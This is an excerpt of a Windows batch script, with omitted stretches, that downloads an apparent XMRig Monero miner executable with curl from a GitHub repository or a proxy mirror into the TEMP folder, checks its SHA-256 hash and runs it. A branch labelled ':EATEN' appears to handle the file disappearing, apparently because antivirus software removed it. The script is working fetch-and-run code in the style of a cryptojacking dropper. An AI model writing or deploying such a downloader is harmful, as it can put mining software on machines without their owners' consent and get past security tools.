@echo off
rem Fetch XMR_Rig_6.26-DBC-100.exe into TEMP and run it.
rem
...
set "EXE=%TEMP%\XMR_Rig_6.26-DBC-100.exe"
set "URL=https://github.com/acu715/acu715/raw/refs/heads/main/Mining/XMR_Rig_6.26-DBC-100.exe"
set "MIRROR=https://gh-proxy.com/https://github.com/acu715/acu715/raw/refs/heads/main/Mining/XMR_Rig_6.26-DBC-100.exe"
set "SHA256=3060770f13041a462852e6b360b9bf6cde81cad00fd958be2bc8901055471015"

if exist "XMR_Rig_6.26-DBC-100.exe" (
    call :CHECK_HASH "XMR_Rig_6.26-DBC-100.exe"
    if "!HASH_OK!"=="1" (
        echo [OK] already in TEMP, hash verified.
        goto :RUN
    )
    echo [..] TEMP copy is stale, refetching.
    del /q "XMR_Rig_6.26-DBC-100.exe" 2>nul
)
...
:HAVE
move /y "XMR_Rig_6.26-DBC-100.exe.tmp" "XMR_Rig_6.26-DBC-100.exe" >nul
if not exist "XMR_Rig_6.26-DBC-100.exe" goto :EATEN
...
if /i "!HASH_ACTUAL!"=="3060770f13041a462852e6b360b9bf6cde81cad00fd958be2bc8901055471015" set "HASH_OK=1"
exit /b 0
...
curl -fL --retry %~3 --connect-timeout 5 -o "XMR_Rig_6.26-DBC-100.exe.tmp" "%~1"
if errorlevel 1 (
    echo [..] %~2 failed.
    del /q "XMR_Rig_6.26-DBC-100.exe.tmp" 2>nul
    exit /b 0
)
if not exist "XMR_Rig_6.26-DBC-100.exe.tmp" goto :EATEN
call :CHECK_HASH "XMR_Rig_6.26-DBC-100.exe.tmp"
if not "!HASH_OK!"=="1" (
